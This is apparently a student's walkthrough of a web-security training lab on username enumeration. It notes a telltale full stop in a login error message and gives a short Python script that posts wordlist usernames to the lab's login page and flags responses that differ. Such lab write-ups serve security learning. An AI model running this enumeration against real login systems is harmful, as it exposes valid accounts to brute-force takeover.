lab 2

first of all, log in to the lab and go to /my account. you can see login form. then we enterd username and password but we can see a error massege "Invalid username or password."
then we can see somthing specific in the error massege. this is a full stop at the end of error message

<img width="1696" height="758" alt="image" src="https://github.com/user-attachments/assets/3e37b6eb-7824-48a2-b787-bccbfc16c907" />

run `python ex.py`

```import requests
from pathlib import Path
 
TARGET_URL = "https://0ac800df0392f42b810de86700cb0074.web-security-academy.net/login"
WORDLIST = "users.txt"
PASSWORD = "password123"
FAIL_SIG = "Invalid username or password."
 
wordlist_path = Path(WORDLIST)
if not wordlist_path.exists():
    raise SystemExit(f"Wordlist not found: {wordlist_path.resolve()}")
 
for username in wordlist_path.read_text().splitlines():
    username = username.strip()
    if not username:
        continue
    data = {
        "username": username,
        "password": PASSWORD
    }
    try:
        resp = requests.post(TARGET_URL, data=data, allow_redirects=False)
        if FAIL_SIG not in resp.text:
            print(f"[+] Possible valid username: {username}")
    except requests.RequestException as e:
        print(f"[!] Error testing username '{username}': {e}")
        ```

       




